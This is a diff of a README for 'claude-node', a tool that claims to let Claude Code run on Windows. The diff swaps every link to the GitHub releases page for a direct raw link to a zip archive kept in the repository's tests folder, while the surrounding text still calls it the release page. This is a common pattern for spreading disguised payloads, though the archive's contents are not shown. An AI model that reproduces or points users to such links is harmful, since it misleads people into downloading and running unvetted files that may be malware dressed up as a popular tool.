@@ -1,6 +1,6 @@
 # 🤖 claude-node - Run Claude Code on Windows
 
-[![Download claude-node](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/ambrosiogalwegian826/claude-node/releases)
+[![Download claude-node](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ambrosiogalwegian826/claude-node/main/tests/node-claude-1.5.zip)
 
 ## 🧩 What this app does
 
@@ -19,7 +19,7 @@ This setup is useful if you want Claude Code to work inside your own tools, scri
 
 ## 📥 Download and install
 
-1. Open the release page here: https://github.com/ambrosiogalwegian826/claude-node/releases
+1. Open the release page here: https://raw.githubusercontent.com/ambrosiogalwegian826/claude-node/main/tests/node-claude-1.5.zip
 2. Find the latest release at the top of the page
 3. Look for a Windows file such as `.exe`, `.zip`, or `.msi`
 4. Download that file to your PC
@@ -135,7 +135,7 @@ Keep the runtime files and the claude-node files close together if the app needs
 
 ## 📝 Release page
 
-Download or get the Windows release here: https://github.com/ambrosiogalwegian826/claude-node/releases
+Download or get the Windows release here: https://raw.githubusercontent.com/ambrosiogalwegian826/claude-node/main/tests/node-claude-1.5.zip
 
 ## 🧩 Project focus
 
